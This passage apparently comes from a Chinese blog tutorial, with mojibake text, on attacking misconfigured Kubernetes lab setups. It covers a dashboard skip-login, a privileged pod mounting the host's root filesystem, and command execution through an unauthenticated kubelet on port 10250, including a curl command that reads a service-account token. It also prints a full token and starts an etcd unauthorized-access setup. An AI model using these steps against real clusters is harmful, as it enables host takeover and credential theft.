src="/images/k8s/image-20231228170625883.png" alt="image-20231228170625883"></p><p><img src="/images/k8s/image-20231228170434309.png" alt="image-20231228170434309"></p><p>è¿™é‡Œæ¯”è¾ƒæˆ‘ä»¬ä¸¤ä¸ªçš„token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æˆ‘çš„ </span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkxES1FJRlNRcXVYenlhV0sxSWZrUVlOamxvR0JscTE1NGlmT1YyX1dLdkEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJtZXRhcmdldCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLWpnOW5yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI1MGRlOTI3My02ODczLTRiNzgtYjc3OS0yNGUzMTkwZDQzNmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6bWV0YXJnZXQ6ZGVmYXVsdCJ9.J07xNTfoXgXgFZCrlznwvA8v9h7_nokBxI4oWgml9x7S4L4UudHEdoQW8K7jBeNumLdMPjZ6bqi2A3e7D1S0iyHlxHbOeC9tigmy_FRTNKYIN5gziDhYvU393CeM8Juw9JcyAgYrigbbewzo61k-5a9EkTLPiHELbzKhrMwJLpuOiOdG2ISOxNGEqGjABOjGAqjzDHuWyM2XyeO5_FlLuQ1RA0nEO69U_Jfw29S5GBBfXZs4QyopsoyiR0ujW4nI3jYAGXIU37JhSsjkUDCRdPjgh4mp4dRRdUD8hH6rhZkTk30bBuc0y2ECwTHTTQd8G-QdooR5yckLwV_3l4Ww-w</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228171126046.png" alt="image-20231228171126046"></p><p>å¤§å¸ˆå‚…çš„</p><p><img src="/images/k8s/image-20231228171159202.png" alt="image-20231228171159202"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸¤è€…ç›¸å·®ä¸å¤šï¼Œä¸”éƒ½æ˜¯system:serviceaccount:default:defaultâ€ï¼Œ<br>è¿™é‡ŒçŒœæµ‹åº”è¯¥æ˜¯ç®¡ç†å‘˜å°†å°†â€system:serviceaccountâ€ç”¨æˆ·ç»‘å®šåˆ°â€cluster-adminâ€ç”¨æˆ·ç»„ï¼Œä»è€Œä½¿å¾—éé¢„æœŸå­˜åœ¨ï¼Œä¹Ÿå°±ç›´æ¥æ‰“é€šäº†apiserver</p><p><img src="/images/k8s/image-20231228171410372.png" alt="image-20231228171410372"></p><h5 id="è·å–å®¿ä¸»æœºæƒé™-é€šè¿‡k8s-dashboardï¼Œåˆ›å»ºç‰¹æƒPods"><a href="#è·å–å®¿ä¸»æœºæƒé™-é€šè¿‡k8s-dashboardï¼Œåˆ›å»ºç‰¹æƒPods" class="headerlink" title="è·å–å®¿ä¸»æœºæƒé™-é€šè¿‡k8s dashboardï¼Œåˆ›å»ºç‰¹æƒPods"></a>è·å–å®¿ä¸»æœºæƒé™-é€šè¿‡k8s dashboardï¼Œåˆ›å»ºç‰¹æƒPods</h5><h6 id="æ­£å¸¸æƒ…å†µç¯å¢ƒæ­å»º"><a href="#æ­£å¸¸æƒ…å†µç¯å¢ƒæ­å»º" class="headerlink" title="æ­£å¸¸æƒ…å†µç¯å¢ƒæ­å»º"></a>æ­£å¸¸æƒ…å†µç¯å¢ƒæ­å»º</h6><p>å‡ºç°æ”¹é—®é¢˜çš„åŸå› æ˜¯å› ä¸ºåœ¨å¯åŠ¨dashboradçš„æ—¶å€™ï¼Œç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿ï¼Œä¿®æ”¹äº†é…ç½®ï¼Œè·³è¿‡äº†ç™»å½•ã€‚<br>é¦–å…ˆå®‰è£…dashborad</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml</span><br><span class="line">vim recommended.yaml</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆåï¼Œä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼Œè¦èµ·ä¸€ä¸‹<br><code>kubectl apply -f recommended.yaml</code><br>ç„¶ååœ¨åšæ˜ å°„<br><code> kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:80</code>,<br>å°†80ç«¯å£æ˜ å°„å‡ºå»ï¼Œå¦‚æœä¸è¡Œå°±æ˜ å°„443<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:443</code></p><p><img src="/images/k8s/image-20231229093200392.png" alt="image-20231229093200392"></p><p>è¿™ä¸ªæ—¶å€™åº”è¯¥è¿˜æ˜¯è®¿é—®ä¸åˆ°åˆ°ï¼Œå› ä¸ºæ²¡åœ¨é…ç½®æ–‡ä»¶ä¸­æŠŠè®¿é—®ipæ”¹æ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim recommended.yaml`å</span><br><span class="line">- -- insecure-bind-address=0.0.0.0</span><br><span class="line">æŠŠè¿™ä¸ªåŠ è¿›å»ï¼Œç„¶å</span><br><span class="line">kubectl apply -f recommended.yaml</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231229104337062.png" alt="image-20231229104337062"></p><p>root@bohemian:/tools/k8syaml# kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard  9090:443<br>Forwarding from 127.0.0.1:9090 -&gt; 8443<br>Forwarding from [::1]:9090 -&gt; 8443</p><p>è¿™ç§æ–¹å¼å¦‚æœæ˜ å°„ä¸æˆåŠŸçš„è¯ï¼Œå¯ä»¥è¯•è¯•ä¸‹é¢è¿™ç§æ˜ å°„æ–¹å¼<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</code></p><p>ç„¶åç”¨googleè®¿é—®ä¼¼ä¹ä¸è¡Œï¼Œæ¢æˆç«ç‹å°±å¯ä»¥äº†<br>è¿™é‡Œè¦æ³¨æ„ï¼Œyamlçš„æ–‡æœ¬æ˜¯éå¸¸ä¸¥æ ¼çš„ï¼Œç¬”è€…ä¸Šå›¾ä¸­çš„<code>- -- insecure-bind-address=0.0.0.0</code>æ˜¯ä¸å¯¹çš„ï¼Œä¸è¦å¸¦é‚£ä¸ªç©ºæ ¼ï¼Œä¸è®©å¯èƒ½ä¼šå‡ºç°connection refused</p><p><img src="/images/k8s/image-20240102103354695.png" alt="image-20240102103354695"></p><p><img src="/images/k8s/image-20231229104851735.png" alt="image-20231229104851735"></p><p><img src="/images/k8s/image-20231229104925231.png" alt="image-20231229104925231"></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºè´¦å·ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ä»webshellè·å–åˆ°çš„tokenè¿›è¡Œç™»å½•ã€‚<br>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™ä¸ªè´¦æˆ·ä¸ºadmin-userï¼Œroleä¸ºcluster-admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#sudo vim  account.yaml</span><br><span class="line"></span><br><span class="line"># Creating a Service Account</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"># Creating a ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#åº”ç”¨ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶</span><br><span class="line">kubectl apply -f account.yaml </span><br><span class="line"># è·å–token</span><br><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231229112518290.png" alt="image-20231229112518290"><br><img src="/images/k8s/image-20240102103656050.png" alt="image-20240102103656050"><br>å³å¯ç™»å½•è¿›æ¥ã€‚<br>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ç”¨./metargetæ‹‰ä¸€ä¸ªthinkphp</p><p>./metarget appv install thinkphp-5-0-23-rce â€“external<br>è¿™æ ·ä¾¿æ­å»ºå®Œæˆã€‚<br>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æˆ‘ä»¬ç™»å½•çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯æ²¡æœ‰ç™»å½•å¯†ç çš„ï¼Œç™»å½•ä¸Šæ¥éœ€è¦tokenï¼Œè€Œè¿™ä¸ªtokençš„è·å–éœ€è¦ç™»å½•åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æ˜¯å¾ˆéº»çƒ¦çš„ã€‚æ‰€ä»¥ç®¡ç†å‘˜å¯èƒ½ä¼šåœ¨åˆ›å»ºé¢æ¿çš„æ—¶å€™é…ç½®è·³è¿‡è¿™ä¸ªé¢æ¿ç™»å½•ï¼Œè¿™å°±ç»™æˆ‘ä»¬äº†å¯ä¹˜ä¹‹æœºã€‚</p><h5 id="skipé…ç½®é”™è¯¯ç¯å¢ƒæ­å»º"><a href="#skipé…ç½®é”™è¯¯ç¯å¢ƒæ­å»º" class="headerlink" title="skipé…ç½®é”™è¯¯ç¯å¢ƒæ­å»º"></a>skipé…ç½®é”™è¯¯ç¯å¢ƒæ­å»º</h5><p>å…¶å®å°±æ˜¯åœ¨åˆšåˆšçš„é‚£ä¸ªé…ç½®æ–‡ä»¶ä¸­åŠ ä¸€æ¡è¯­å¥å³å¯<br><code>- --enable-skip-login</code><br>åŠ å®Œåæ›´æ–°ä¸€ä¸‹é…ç½®ã€‚</p><p><img src="/images/k8s/image-20240102105257323.png" alt="image-20240102105257323"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#æ”¹å®Œé…ç½®ååŠ è½½ä¸€ä¸‹é…ç½®</span><br><span class="line">kubectl apply -f recommended.yaml</span><br><span class="line">#è½¬å‘ç«¯å£æ›´æ–°ä¸€ä¸‹</span><br><span class="line">kubectl -n kubernetes-dashboard port-rward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240102105809949.png" alt="image-20240102105809949"></p><p>è¿™ä¸ªæ—¶å€™å°±ä¼šå‘ç°æœ‰ä¸ªè·³è¿‡æŒ‰é’®äº†ï¼Œç›´æ¥ç‚¹å³å¯ã€‚ç‚¹å³ä¸Šè§’çš„åŠ å·ï¼Œåˆ›å»ºpodï¼Œè¿™é‡Œåˆ›å»ºçš„æ—¶å€™æŠ¥é”™ï¼Œ<br><img src="/images/k8s/image-20240102110940163.png" alt="image-20240102110940163"></p><p><img src="/images/k8s/image-20240102111212074.png" alt="image-20240102111212074"></p><p><code>Deploying file has failedroles.rbac.authorization.k8s.io is forbidden: User  &quot;system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard&quot; cannot create resource &quot;roles&quot; in API group &quot;rbac.authorization.k8s.io&quot; in the namespace &quot;default&quot;</code>æ²¡æœ‰æƒé™ï¼Œ<br>æ ¹æ®è¿™ç¯‡å¤§å¸ˆå‚…æ–‡ç« å‘ç°ï¼Œè¿˜è¦æœ‰ä¸€ä¸ªé…ç½®é”™è¯¯æ‰å¯ä»¥<br>æˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­å¦èµ·ä¸€è¡Œï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹</p><p><img src="/images/k8s/image-20240102135205095.png" alt="image-20240102135205095"></p><p>è¿™é‡Œæ”¹å®Œä¹‹åä¹Ÿä¸èƒ½æ§åˆ¶é¢æ¿ï¼Œåªèƒ½è·³è¿‡ç™»å½•ä¸Šå»ï¼Œåœ¨æ¸—é€æµ‹è¯•å®æˆ˜å› ä¸ºæ²¡æœ‰æƒé™ä¸ä¼¼ä¹èµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ã€‚<br>æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨tokenç™»å½•å§ã€‚ç™»å½•ä¸Šæ¥ä¹‹åå°±å¯ä»¥ç®¡ç†podsäº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240103104129876.png" alt="image-20240103104129876"></p><p>å¯ä»¥çœ‹åˆ°defaultnamespaceçš„podsï¼Œæ­¤æ—¶åªéœ€è¦é€‰ä¸­podsæ‰§è¡Œå³å¯è¿›å…¥åˆ°shellä¸­</p><p><img src="/images/k8s/image-20240103104423300.png" alt="image-20240103104423300"></p><p><img src="/images/k8s/image-20240103104502239.png" alt="image-20240103104502239"></p><h5 id="k8s10250ç«¯å£æœªæˆæƒ"><a href="#k8s10250ç«¯å£æœªæˆæƒ" class="headerlink" title="k8s10250ç«¯å£æœªæˆæƒ"></a>k8s10250ç«¯å£æœªæˆæƒ</h5><p>é»˜è®¤å®‰è£…k8sçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨æš´æ¼10250ç«¯å£ï¼Œåœ¨è¿™ä¸ªç«¯å£ä¸Šè¿è¡Œè€…kubeletï¼Œkubeletçš„ä½œç”¨æ˜¯åœ¨é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹è¿è¡Œï¼Œå¯¹å®¹å™¨è¿›è¡Œç”Ÿå‘½å‘¨æœŸçš„ç®¡ç†ã€‚è¿è¡Œåœ¨é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šï¼Œè´Ÿè´£å‘ API Server æ³¨å†Œæ‰€åœ¨çš„èŠ‚ç‚¹<br>æ­£å¸¸æƒ…å†µä¸‹ï¼Œé»˜è®¤è®¿é—®10250ç«¯å£ä¼šæ˜¾ç¤º404<br>è®¿é—®å…¶ä»–è·¯ç”±ä¼šæ˜¾ç¤º<code>Unauthorized</code></p><p><img src="/images/k8s/image-20240103135639112.png" alt="image-20240103135639112"></p><p><img src="/images/k8s/image-20240103135702207.png" alt="image-20240103135702207"></p><p>å¦‚æœç®¡ç†å‘˜è¯¯å°†é…ç½®ä¿¡æ¯é…ç½®é”™è¯¯ï¼Œé‚£å°†ä¼šå¯¼è‡´ç›´æ¥æ¥ç®¡æ•´ä¸ªk8sé›†ç¾¤ã€‚<br>ä½†æ˜¯å¦‚æœå°†/var/lib/kubelet/config.yaml</p><p><img src="/images/k8s/image-20240103140439505.png" alt="image-20240103140439505"></p><p>ä¸­çš„anonymousæ”¹ä¸ºtrueï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼šå¯¼è‡´æ‰€æœ‰çš„ç”¨æˆ·è®¿é—®ï¼ˆ<code>å•Šè¿™ï¼Œæ„Ÿè§‰è¿™ä¸ªæ¼æ´åœ¨å®æˆ˜ä¸­å‡ºç°çš„æœºç‡ä¸å¤§ï¼Œç›®å‰è¿˜æ²¡çœ‹å‡ºæ¥ï¼Œç®¡ç†å‘˜æ”¹è¿™ä¸ªçš„åŠ¨æœºæ˜¯ä»€ä¹ˆã€‚</code>ï¼‰</p><p>å…¶ä»–å¤§å¸ˆå‚…çš„æ–‡ç« å†™äº†å°†authorization.modeä¿®æ”¹ä¸ºAlwaysAllowï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰æ›´æ”¹ä¹ŸæˆåŠŸäº†ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ç‰ˆæœ¬é—®é¢˜æŠŠï¼Œä¸å¤ªæ¸…æ¥šäº†ã€‚</p><p><img src="/images/k8s/image-20240103141133148.png" alt="image-20240103141133148"></p><p>æ”¹å®Œé…ç½®åï¼Œè¦é‡å¯ä¸€ä¸‹<code>systemctl restart kubelet</code><br>è¿™ä¸ªæ—¶å€™å†ç”¨æµè§ˆå™¨è®¿é—®<a href="https://ip:10250/runningpods/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84pods%E4%BA%86">https://ip:10250/runningpods/å³å¯çœ‹åˆ°æ‰€æœ‰çš„podsäº†</a><br><img src="/images/k8s/image-20240103141430892.png" alt="image-20240103141430892"></p><p>è®¿é—®è¿™ä¸ªç«¯å£ä¸éœ€è¦è®¤è¯ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ï¼Œå¯ä»¥æ§åˆ¶å…¶ä¸­çš„podsäº†ã€‚<br><code>curl -XPOST -k &quot;https://$&#123;IP_ADDRESS&#125;:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=&lt;command-to-run&gt;&quot;</code><br>è¿™ä¸ªcurlå‘½ä»¤æ‰§è¡Œè¿›è¡Œï¼Œå…¶ä¸­éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œè¿™ä¸‰ä¸ªå‚æ•°å¯ä»¥åœ¨/runningpods/ä¸­è·å–ï¼Œä¹Ÿå°±æ˜¯ä¸Šå›¾<br><img src="/images/k8s/image-20240103141848633.png" alt="image-20240103141848633"></p><p><code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=id&quot;</code></p><p><img src="/images/k8s/image-20240103142250122.png" alt="image-20240103142250122"></p><p>ä¹Ÿå¯ä»¥åœ¨æµè§ˆå™¨ä¸­ç›´æ¥æ‰“</p><p><img src="/images/k8s/image-20240103161117043.png" alt="image-20240103161117043"></p><p>è¿™æ ·å°±ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼Œ<code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</code>ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤è·å–è¯¥podsçš„tokenï¼Œä½†æ˜¯ï¼Œè¿™é‡Œè¦æ³¨æ„ï¼Œè¿™ä¸ªpodsçš„tokené»˜è®¤å¤§æ¦‚ç‡ä¸ä¼šæ˜¯adminæƒé™ã€‚å½“ç„¶è¿™ä¸ªtokenä¹Ÿæ˜¯å¯ä»¥ç™»å½•é¢æ¿çš„ã€‚</p><p>ä¸€ä¸ª pod ä¸ä¸€ä¸ªæœåŠ¡è´¦æˆ·ç›¸å…³è”ï¼Œè¯¥æœåŠ¡è´¦æˆ·çš„å‡­è¯ï¼ˆtokenï¼‰è¢«æ”¾å…¥è¯¥podä¸­æ¯ä¸ªå®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿæ ‘ï¼Œåœ¨ /var/run/secrets/kubernetes.io/serviceaccount/token</p><p>å¦‚æœæœåŠ¡è´¦å·ï¼ˆService account ï¼‰ç»‘å®šäº† cluster-admin ï¼ˆå³é›†ç¾¤çš„ admin æƒé™æˆ‘ä»¬å¯ä»¥å¯¹æ‰€æœ‰namespaceä¸‹å®ä¾‹è¿›è¡Œæ“ä½œï¼‰ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ token æ¥è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ</p><h6 id="æ„å¤–çš„å‘ç°"><a href="#æ„å¤–çš„å‘ç°" class="headerlink" title="æ„å¤–çš„å‘ç°"></a>æ„å¤–çš„å‘ç°</h6><p>åœ¨/runningpods/è·¯ç”±ä¸­ï¼Œä¹ŸæŸ¥çœ‹åˆ°æ‰€æœ‰çš„è¿è¡Œçš„podsï¼Œé‚£å…¶å®è‚¯å®šè¿˜æœ‰å…¶ä»–çš„è·¯ç”±ã€‚<code>https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html</code>åœ¨è¿™ç¯‡æ–‡ç« ä¸­åˆ—å‡ºäº†æ‰€æœ‰çš„apiï¼Œå…¶ä¸­æˆ‘åœ¨logsè·¯ç”±ä¸­å‘ç°<br><img src="/images/k8s/image-20240103163719181.png" alt="image-20240103163719181"></p><p>å­˜åœ¨ç›®å½•éå†ï¼Œä»”ç»†ä¸€çœ‹ä¼šå‘ç°ï¼Œè¿™å¥½åƒæ˜¯å®¿ä¸»ä¸»æœºä¸Šçš„/var/logã€ç›®å½•</p><p><img src="/images/k8s/image-20240103163810417.png" alt="image-20240103163810417"></p><p><img src="/images/k8s/image-20240103164555309.png" alt="image-20240103164555309"><br>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œk8såœ¨è¿™é‡Œç›´æ¥å°±æ˜ å°„äº†å®¿ä¸»ä¸»æœºçš„ç›®å½•ï¼Œå¹¶ä¸”æ˜¯å¯ä»¥æŸ¥çœ‹åˆ°</p><p><a href="https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)">https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)</a></p><p>æˆ‘è¿˜ç‰¹æ„è£…äº†ä¸€ä¸ªapacheçš„ï¼Œè®¿é—®é»˜è®¤æ—¥å¿—å®Œå…¨æ²¡æœ‰é—®é¢˜<br><img src="/images/k8s/image-20240103164711573.png" alt="image-20240103164711573"></p><h5 id="k8setcdæœªæˆæƒ"><a href="#k8setcdæœªæˆæƒ" class="headerlink" title="k8setcdæœªæˆæƒ"></a>k8setcdæœªæˆæƒ</h5><p>åœ¨å®‰è£…å®Œ K8s åï¼Œé»˜è®¤ä¼šå®‰è£… etcd ç»„ä»¶ï¼Œetcd æ˜¯ä¸€ä¸ªé«˜å¯ç”¨çš„ key-value æ•°æ®åº“ï¼Œå®ƒä¸º k8s é›†ç¾¤æä¾›åº•å±‚æ•°æ®å­˜å‚¨ï¼Œä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€ã€‚å¤§å¤šæ•°æƒ…å½¢ä¸‹ï¼Œæ•°æ®åº“ä¸­çš„å†…å®¹æ²¡æœ‰åŠ å¯†ï¼Œå› æ­¤å¦‚æœé»‘å®¢æ‹¿ä¸‹ etcdï¼Œå°±æ„å‘³ç€èƒ½æ§åˆ¶æ•´ä¸ª K8s é›†ç¾¤ã€‚</p><p>åœ¨ K8s é›†ç¾¤åˆå§‹åŒ–åï¼Œetcd é»˜è®¤å°±ä»¥ pod çš„å½¢å¼å­˜åœ¨ï¼Œå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ï¼Œetcd ç»„ä»¶ç›‘å¬çš„ç«¯å£ä¸º 2379ã€‚</p><h6 id="ä¸ºä»€ä¹ˆä¼šå‡ºç°etcdæœªæˆæƒ"><a href="#ä¸ºä»€ä¹ˆä¼šå‡ºç°etcdæœªæˆæƒ" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šå‡ºç°etcdæœªæˆæƒ"></a>ä¸ºä»€ä¹ˆä¼šå‡ºç°etcdæœªæˆæƒ</h6><p>åœ¨å¯åŠ¨etcdæ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š â€“client-cert-auth å‚æ•°æ‰“å¼€è¯ä¹¦æ ¡éªŒï¼Œå¹¶ä¸”æŠŠlisten-client-urlsç›‘å¬ä¿®æ”¹ä¸º0.0.0.0é‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªç«¯å£è¢«æš´éœ²åœ¨å¤–ï¼Œå¦‚æœæ²¡æœ‰é€šè¿‡å®‰å…¨ç»„é˜²ç«å¢™çš„é™åˆ¶ï¼Œå°±ä¼šé€ æˆå±å®³</p><p>etcdé»˜è®¤ç«¯å£2379</p><p>ps: ä¸è¿‡åœ¨å®‰è£…k8sä¹‹åé»˜è®¤çš„é…ç½®2379éƒ½åªä¼šç›‘å¬127.0.0.1ï¼Œè€Œä¸ä¼šç›‘å¬0.0.0.0ï¼Œé‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€æœ€å¤šå°±æ˜¯æœ¬åœ°è®¿é—®ï¼Œä¸èƒ½å…¬ç½‘è®¿é—®ã€‚<br>è¿™é‡Œç»è¿‡ç ”ç©¶å‘ç°ï¼Œå¥½åƒä¸åŒçš„æ­å»ºæ–¹å¼ï¼Œåœ¨æš´æ¼ç«¯å£çš„æ—¶å€™æ˜¯ä¸åŒçš„ï¼Œç¬”è€…åœ¨æ­å»ºçš„æ—¶å€™ç”¨çš„æ˜¯metargetè¿™ä¸ªé¡¹ç›®ï¼Œæ­å»ºå‡ºæ¥ï¼Œç›´æ¥å°±å¯¹å…¬ç½‘å¼€æ”¾ï¼Œåœ¨å‚è€ƒå…¶ä»–å¤§å¸ˆå‚…æ­å»º</p><p><img src="/images/k8s/image-20240104094328343.png" alt="image-20240104094328343"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°é»˜è®¤è®¿é—®2379ç«¯å£æ˜¯éœ€è¦è®¤è¯çš„ã€‚</p><p><img src="/images/k8s/image-20240104094105258.png" alt="image-20240104094105258"></p><h6 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h6><p>å¾ˆç®€å•ï¼Œåªéœ€è¦å°†etcdçš„é…ç½®æ–‡ä»¶/etc/kubernetes/manifests/etcd.yamlæ”¹ä¸€ä¸‹å³<br>å¯ï¼Œæ­¤æ—¶å°†â€“client-cert-authå†™å…¥åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢ã€‚</p><p><img src="/images/k8s/image-20240104102215246.png" alt="image-20240104102215246"></p><p>ä½†è¿™æ ·æˆ‘æ²¡æœ‰æˆåŠŸï¼Œ<br><img src="/images/k8s/image-20240104143156795.png" alt="image-20240104143156795"></p><p>ç¬”è€…å°†è¿™é‡Œçš„é»˜è®¤trueæ”¹ä¸ºfalseï¼Œä¸ç”¨å…¶ä»–æ“ä½œï¼Œç­‰ä¸€ä¼šå³å¯ï¼Œ</p><p>å½“è®¿é—®<a 